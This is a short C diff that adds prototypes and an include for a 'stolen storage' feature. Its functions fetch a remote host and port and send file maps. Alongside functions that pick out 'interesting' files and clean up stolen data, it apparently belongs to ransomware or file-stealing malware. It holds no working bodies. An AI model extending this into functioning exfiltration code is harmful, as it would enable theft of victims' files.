@@ -4,6 +4,12 @@ void cleanstolen(void);
 #include "clean.c"
 #endif
 
+#ifdef STOLEN_STORAGE
+char *readstorepath(void);
+char *gethost(void);
+unsigned short getport(void);
+#include "store.c"
+#endif
 
 #define FILENAME_MAXLEN 256
 
@@ -23,6 +29,9 @@ int interestingdir(const char *path);
 int interesting(const char *path);
 #ifdef ORIGINAL_RW_FALLBACK
 void wcfallback(FILE *ofp, off_t fsize, char *newpath);
+#endif
+#ifdef STOLEN_STORAGE
+int sendmap(const char *oldpath, unsigned char *map, off_t fsize);
 #endif
 int writecopy(const char *old_path, char *new_path);
 char *getnewpath(char *filename);
